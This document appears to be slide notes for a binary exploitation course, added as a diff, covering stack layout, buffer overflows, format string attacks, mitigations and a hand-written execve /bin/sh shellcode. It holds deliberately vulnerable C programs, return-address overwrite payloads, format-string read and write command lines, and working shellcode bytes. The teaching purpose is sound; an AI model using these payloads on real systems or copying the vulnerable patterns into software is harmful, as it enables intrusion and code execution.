@@ -1,0 +1,497 @@
+Override Start : 
+![My Logo](./me)
+┌─────────────────────────────────────────┐
+│ 1. Memory Architecture                  │
+│    └─ Stack, Heap, Segments             │
+│                                         │
+│ 2. Buffer Overflow Exploitation         │
+│    └─ Stack corruption techniques       │
+│                                         │
+│ 3. Format String Attacks                │
+│    └─ Arbitrary read/write primitives   │
+│                                         │
+│ 4. GOT/PLT Hijacking                    │
+│    └─ Dynamic linking exploitation      │
+│                                         │
+│ 5. Modern Security Mechanisms           │
+│    └─ ASLR, DEP, Canaries, RELRO        │
+│                                         │
+│                                         │
+│                                         │
+└─────────────────────────────────────────┘
+
+MEMORY FUNDAMENTALS
+
+High Addresses (0x7FFFFFFFFFFF)
+┌────────────────────────────────────┐
+│         Kernel Space                │  ← OS kernel memory
+│      (Protected from user)          │
+├────────────────────────────────────┤  0x00007FFFFFFFFFFF
+│                                     │
+│         Stack                       │  ← Local variables
+│         ↓ grows downward            │    Function calls
+│                                     │    Return addresses
+├────────────────────────────────────┤
+│                                     │
+│         (unused space)              │
+│                                     │
+├────────────────────────────────────┤
+│         ↑ grows upward              │
+│         Heap                        │  ← malloc(), new
+│                                     │    Dynamic allocation
+├────────────────────────────────────┤
+│         BSS Segment                 │  ← Uninitialized
+│         (Zero-initialized)          │    global variables
+├────────────────────────────────────┤
+│         Data Segment                │  ← Initialized
+│         (Initialized data)          │    global/static vars
+├────────────────────────────────────┤
+│         Text Segment                │  ← Program code
+│         (Read-only code)            │    (executable)
+└────────────────────────────────────┘  0x0000000000400000
+Low Addresses
+
+
+CPU Registers (x86-64)
+Essential Registers for Exploitation:
+
+┌──────────────────────────────────────────────┐
+│  Instruction Pointer                         │
+│  ├─ RIP (64-bit) / EIP (32-bit)             │
+│  └─ Points to next instruction to execute   │
+├──────────────────────────────────────────────┤
+│  Stack Pointer                               │
+│  ├─ RSP (64-bit) / ESP (32-bit)             │
+│  └─ Points to top of stack                  │
+├──────────────────────────────────────────────┤
+│  Base Pointer                                │
+│  ├─ RBP (64-bit) / EBP (32-bit)             │
+│  └─ Points to base of current stack frame   │
+├──────────────────────────────────────────────┤
+│  General Purpose                             │
+│  ├─ RAX/RBX/RCX/RDX                         │
+│  └─ Used for data manipulation              │
+└──────────────────────────────────────────────┘
+
+Stack Frame Structure:
+
+High Memory Addresses
+┌──────────────────────────────────┐
+│   Function Arguments              │  ← Parameters passed
+│   (arg1, arg2, ...)               │
+├──────────────────────────────────┤
+│   Return Address                  │  ← Where to jump back
+│   (saved RIP/EIP)                 │    CRITICAL for exploits
+├──────────────────────────────────┤
+│   Saved Base Pointer              │  ← Previous frames RBP
+│   (saved RBP/EBP)                 │
+├──────────────────────────────────┤  ← Current RBP points here
+│   Local Variables                 │
+│   (var1, var2, ...)               │
+├──────────────────────────────────┤
+│   Buffers                         │  ← VULNERABLE area
+│   (char buffer[64])               │
+└──────────────────────────────────┘  ← RSP points here
+Low Memory Addresses
+
+
+Function Call Example :
+
+
+int add(int a, int b) {
+    int result;
+    result = a + b;
+    return result;
+}
+
+int main() {
+    int x = 5;
+    int y = 3;
+    int sum = add(x, y);
+    return 0;
+}
+```
+
+**Stack Evolution:**
+```
+STEP 1: Before calling add()
+┌─────────────────┐
+│   y = 3         │  ← mains locals
+│   x = 5         │
+└─────────────────┘
+
+STEP 2: Arguments pushed
+┌─────────────────┐
+│   b = 3         │  ← arg2
+│   a = 5         │  ← arg1
+│   y = 3         │
+│   x = 5         │
+└─────────────────┘
+
+STEP 3: CALL instruction
+┌─────────────────┐
+│   Return Addr   │  ← 0x08048500
+│   b = 3         │
+│   a = 5         │
+│   y = 3         │
+│   x = 5         │
+└─────────────────┘
+
+STEP 4: Function prologue
+┌─────────────────┐
+│   result        │  ← local var
+│   Saved RBP     │
+│   Return Addr   │
+│   b = 3         │
+│   a = 5         │
+└─────────────────┘
+
+STEP 5: After RET instruction
+┌─────────────────┐
+│   sum = 8       │  ← back in main
+│   y = 3         │
+│   x = 5         │
+└─────────────────┘
+
+
+STACK & BUFFER OVERFLOW
+
+#include <stdio.h>
+#include <string.h>
+
+void vulnerable_function(char *input) {
+    char buffer[64];           // 64 bytes allocated
+    strcpy(buffer, input);     // NO bounds checking!
+    printf("You entered: %s\n", buffer);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        printf("Usage: %s <input>\n", argv[0]);
+        return 1;
+    }
+    vulnerable_function(argv[1]);
+    return 0;
+}
+
+Safe Alternative:
+
+strncpy(buffer, input, sizeof(buffer) - 1);
+buffer[sizeof(buffer) - 1] = '\0';
+```
+
+---
+
+Stack State - Normal Operation**
+```
+═══════════════════════════════════════════════
+    NORMAL EXECUTION (Input: "Hello" - 5 bytes)
+═══════════════════════════════════════════════
+
+Memory Layout:                    Addresses
+┌────────────────────────────┐   0x7fffffffe180
+│  argv[1] = "Hello"         │   
+├────────────────────────────┤   0x7fffffffe170
+│  Return Address:           │   
+│  0x0000000008048500        │   ← Back to main()
+├────────────────────────────┤   0x7fffffffe168
+│  Saved RBP:                │   
+│  0x00007fffffffe100        │   ← Previous frame
+├────────────────────────────┤   0x7fffffffe160
+│                            │
+│  buffer[0-4]: 'H''e''l'    │   
+│               'l''o'       │
+│  buffer[5]:   '\0'         │   
+│  buffer[6-63]: [UNUSED]    │   ← Garbage/zeros
+│                            │
+└────────────────────────────┘   0x7fffffffe120
+
+Status: ✅ SAFE
+- Buffer contains only 6 bytes (5 chars + null)
+- No overflow occurred
+- Return address intact
+- Program will return normally to main()
+```
+
+---
+
+**Slide 11: Stack State - Buffer Overflow**
+```
+═══════════════════════════════════════════════
+  OVERFLOW EXECUTION (Input: 'A' × 80 bytes)
+═══════════════════════════════════════════════
+
+Memory Layout:                    Addresses
+┌────────────────────────────┐   0x7fffffffe180
+│  argv[1] = "AAA...AAA"     │   (80 As)
+├────────────────────────────┤   0x7fffffffe170
+│  Return Address:           │   
+│  0x4141414141414141 ❌     │   ← CORRUPTED!
+│  (was 0x08048500)          │      "AAAAAAAA"
+├────────────────────────────┤   0x7fffffffe168
+│  Saved RBP:                │   
+│  0x4141414141414141 ❌     │   ← CORRUPTED!
+├────────────────────────────┤   0x7fffffffe160
+│                            │
+│  buffer[0-63]:             │
+│  AAAAAAAAAAAAAAAAAAAAAA    │   ← Filled (64 bytes)
+│  AAAAAAAAAAAAAAAAAAAAAA    │
+│  AAAAAAAAAAAA              │
+│                            │
+│  OVERFLOW ZONE:            │
+│  buffer[64-71]: AAAAAAAA   │   ← Overwrites RBP!
+│  buffer[72-79]: AAAAAAAA   │   ← Overwrites Return!
+└────────────────────────────┘   0x7fffffffe120
+
+Status: ❌ CRASHED
+- Buffer exceeded by 16 bytes
+- Saved RBP overwritten with 0x4141414141414141
+- Return address overwritten with 0x4141414141414141
+- CPU tries to jump to 0x4141414141414141
+- Invalid address → SEGMENTATION FAULT
+```
+
+**What happens:**
+```
+Program flow:
+1. vulnerable_function() finishes
+2. Executes RET instruction
+3. Pops return address from stack: 0x4141414141414141
+4. CPU sets RIP = 0x4141414141414141
+5. Tries to fetch instruction from invalid address
+6. SEGFAULT! Program crashes
+```
+
+---
+
+Controlled Exploitation**
+
+**Goal:** Instead of crashing, redirect execution to our code!
+
+**Strategy:**
+1. Calculate exact offset to return address (72 bytes)
+2. Place shellcode in memory
+3. Overwrite return address with shellcode location
+4. Program jumps to our shellcode → shell access!
+```
+═══════════════════════════════════════════════
+           EXPLOITATION PAYLOAD STRUCTURE
+═══════════════════════════════════════════════
+
+Offset    Content              Purpose
+───────────────────────────────────────────────
+0-63      'A' × 64            Fill buffer completely
+64-71     'B' × 8             Overwrite saved RBP (dont care)
+72-79     0x7fffffffe1a0      Overwrite return address
+                              → Points to our shellcode!
+80-110    \x31\xc0\x50...     Shellcode (execve /bin/sh)
+───────────────────────────────────────────────
+
+Memory after exploitation:
+┌────────────────────────────┐   0x7fffffffe1a0
+│  Shellcode starts here:    │   ← Return addr points here!
+│  \x31\xc0\x50\x68\x2f...   │
+├────────────────────────────┤   0x7fffffffe170
+│  Return Address:           │   
+│  0x00007fffffffe1a0 ✅     │   ← Controlled!
+├────────────────────────────┤   0x7fffffffe168
+│  Saved RBP: 0x4242... ✅   │   
+├────────────────────────────┤   0x7fffffffe160
+│  buffer: AAA...AAA ✅      │   
+└────────────────────────────┘   0x7fffffffe120
+
+Execution Flow:
+vulnerable_function() ends
+    ↓
+RET pops 0x7fffffffe1a0
+    ↓
+RIP = 0x7fffffffe1a0
+    ↓
+Execute shellcode
+    ↓
+Shell spawned! 🎯
+
+
+Printf Family Overview :
+
+int printf(const char *format, ...);
+int fprintf(FILE *stream, const char *format, ...);
+int sprintf(char *str, const char *format, ...);
+int snprintf(char *str, size_t size, const char *format, ...);
+```
+
+**Format Specifiers:**
+```
+%d    - Decimal integer
+%x    - Hexadecimal integer
+%s    - String (reads from pointer)
+%p    - Pointer address
+%n    - Write number of bytes printed to pointer
+%c    - Character
+
+int age = 25;
+printf("Age: %d\n", age);  ✅ SAFE
+// Output: Age: 25
+
+char user_input[100];
+gets(user_input);
+printf(user_input);  ❌ DANGEROUS!
+// User controls format string!
+
+
+#include <stdio.h>
+
+void vulnerable(char *input) {
+    printf(input);  // BUG: user controls format!
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        printf("Usage: %s <input>\n", argv[0]);
+        return 1;
+    }
+    vulnerable(argv[1]);
+    return 0;
+}
+
+Safe Version:
+
+
+void safe(char *input) {
+    printf("%s", input);  // ✅ User input treated as data
+}
+
+Attack 1: Stack Leaking
+# Normal input
+$ ./vuln "Hello"
+Hello
+
+# Leak stack with %x
+$ ./vuln "AAAA.%x.%x.%x.%x"
+AAAA.ffffe180.8048500.41414141.252e7825
+
+# What happened?
+Input: "AAAA.%x.%x.%x.%x"
+       └─┬─┘ └────┬─────┘
+         │        └─ Format specifiers
+         └─ Marker (0x41414141)
+
+Stack view:
+┌──────────────┐
+│ 0x252e7825   │ ← 4th %x reads this
+│ 0x41414141   │ ← 3rd %x reads this (our "AAAA"!)
+│ 0x08048500   │ ← 2nd %x reads this
+│ 0xffffe180   │ ← 1st %x reads this
+│ format ptr   │
+└──────────────┘
+
+Attack 2: Arbitrary Memory Read
+
+# Read address 0x08049000
+$ ./vuln $(python -c 'print("\x00\x90\x04\x08" + "%3$s")')
+<contents of 0x08049000>
+
+# Explanation:
+"\x00\x90\x04\x08"  ← Address to read (little-endian)
+"%3$s"               ← Read string at 3rd argument position
+
+Attack 3: Arbitrary Memory Write with %n
+
+int count;
+printf("Hello%n\n", &count);
+// count = 5 (because "Hello" is 5 characters)
+
+Exploitation:
+
+# Goal: Write 0xdeadbeef to address 0x08049000
+
+
+# Payload structure:
+[Target Address][Padding][%n specifier]
+
+# Example:
+$ ./vuln $(python -c 'print("\x00\x90\x04\x08" + "AAAA" + "%4$n")')
+
+# What happens:
+1. "\x00\x90\x04\x08" placed on stack (target address)
+2. "AAAA" printed (4 bytes)
+3. %4$n writes 8 (total bytes) to address 0x08049000
+
+Writing Large Values:
+
+# To write 0xdeadbeef (3735928559 in decimal)
+target = 0x08049000
+
+# Split into 2 writes (for efficiency)
+# Write 0xdead to target
+# Write 0xbeef to target+2
+
+payload = p32(target) + p32(target + 2)
+payload += "%56813x"   # Print 56813 chars (0xdead - 8)
+payload += "%4$hn"     # Write short to first address
+payload += "%8378x"    # Print 8378 more (0xbeef - 0xdead)
+payload += "%5$hn"     # Write short to second address
+
+
+
+Checksec Analysis 
+
+
+ASLR : Randomisation addresses
+NX/DEP : Stack non-exécutable
+Stack Canary :  Détecte overflow  Pas de shellcode direct
+PIE :   Addresses imprévisibles
+RELRO: Read-Only GOT , Pas de GOT overwrite
+
+
+
+SHELLCODE.ASM - Complete Code
+
+
+Execute this command in Linux:
+/bin/sh
+
+Using syscall:
+execve("/bin/sh", NULL, NULL)
+
+
+
+section .text
+global _start
+
+_start:
+    
+    xor eax, eax        
+    xor ebx, ebx        
+    xor ecx, ecx        
+    xor edx, edx        
+    
+   
+    push eax            
+    push 0x68732f2f     
+    push 0x6e69622f     
+    
+    
+    mov ebx, esp        
+    mov ecx, eax        
+    mov edx, eax        
+    mov al, 0x0b        
+    int 0x80           
+
+
+    char shellcode[] = 
+    "\x31\xc0"              // xor eax,eax
+    "\x31\xdb"              // xor ebx,ebx
+    "\x31\xc9"              // xor ecx,ecx
+    "\x31\xd2"              // xor edx,edx
+    "\x50"                  // push eax
+    "\x68\x2f\x2f\x73\x68"  // push 0x68732f2f
+    "\x68\x2f\x62\x69\x6e"  // push 0x6e69622f
+    "\x89\xe3"              // mov ebx,esp
+    "\x89\xc1"              // mov ecx,eax
+    "\x89\xc2"              // mov edx,eax
+    "\xb0\x0b"              // mov al,0xb
+    "\xcd\x80";             // int 0x80
+
+// Length: 25 bytes
+// NULL bytes: 0 ✅
